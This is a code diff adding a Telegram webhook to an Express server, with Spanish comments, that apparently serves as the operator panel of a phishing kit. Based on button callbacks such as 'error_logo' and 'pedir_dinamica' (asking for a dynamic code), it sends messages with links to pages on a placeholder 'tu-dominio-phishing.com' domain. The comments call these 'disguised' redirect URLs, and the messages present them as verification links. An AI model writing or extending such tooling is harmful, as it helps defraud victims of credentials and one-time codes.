@@ -111,6 +111,76 @@ app.post('/editMessageReplyMarkup', async (req, res) => {
   }
 });
 
+app.post('/webhook', async (req, res) => {
+  try {
+    const update = req.body;
+
+    // Ignoramos todo lo que no sea callback_query por ahora
+    if (update.callback_query) {
+      const callbackQuery = update.callback_query;
+      const data = callbackQuery.data;
+      const chatId = callbackQuery.message.chat.id;
+      const messageId = callbackQuery.message.message_id;
+
+      console.log('Callback recibido:', data);
+
+      // 1. Responder inmediatamente al callback (obligatorio para quitar el loading en Telegram)
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          callback_query_id: callbackQuery.id,
+          // Puedes poner show_alert: true si quieres mostrar popup
+        })
+      });
+
+      // 2. Eliminar botones (buena práctica)
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [] }
+        })
+      });
+
+      // 3. Aquí decides qué hacer con cada callback_data
+      // En vez de redirigir en el cliente, puedes:
+      //   - Enviar un mensaje al usuario con la acción
+      //   - Guardar en una DB temporal el estado por transactionId
+      //   - Pero como tu flujo es redirigir páginas HTML, la opción más simple es:
+      //     Enviar un mensaje al chat con un link temporal o instrucción
+
+      // Alternativa práctica: Enviar mensaje con URL de redirección disfrazada
+      let redirectUrl = '';
+
+      if (data.startsWith('error_logo:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/index1.html';
+      } else if (data.startsWith('pedir_dinamica:')) {
+        redirectUrl = 'https://tu-dominio-phishing.com/index3.html';
+      } // ... agrega todos tus cases
+
+      if (redirectUrl) {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: `Continúa aquí: ${redirectUrl}\n(Enlace de verificación)`,
+            parse_mode: 'HTML'
+          })
+        });
+      }
+    }
+
+    res.sendStatus(200); // Telegram necesita 200 OK rápido
+  } catch (err) {
+    console.error('Error en webhook:', err);
+    res.sendStatus(500);
+  }
+});
+
 // Ruta de health check (útil para Render)
 app.get('/health', (req, res) => {
   res.json({ status: 'ok', timestamp: new Date().toISOString() });
